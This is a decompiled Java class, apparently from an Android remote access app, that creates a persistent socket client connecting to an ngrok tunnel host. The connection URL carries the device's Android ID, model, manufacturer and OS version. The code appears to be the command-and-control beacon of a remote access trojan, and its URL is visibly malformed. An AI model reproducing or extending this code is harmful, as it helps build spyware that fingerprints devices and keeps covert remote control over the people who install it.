package com.remote.app;

import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import b.a.b.I;
import b.a.b.b;
import b.a.b.w;
import java.net.URISyntaxException;
/* loaded from: C:\Users\NACCHU~1.OMS\AppData\Local\Temp\jadx-1206019870735559761.dex */
public class h {
    private static h a = new h();
    private I b;

    private h() {
        try {
            String string = Settings.Secure.getString(MainService.a().getContentResolver(), "android_id");
            b.a aVar = new b.a();
            ((w.c) aVar).t = true;
            ((w.c) aVar).v = 5000L;
            ((w.c) aVar).w = 999999999L;
            this.b = b.a("http://https://1aee-14-97-233-50.in.ngrok.io :80?model=" + Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + string);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    public static h a() {
        return a;
    }

    public I b() {
        return this.b;
    }
}
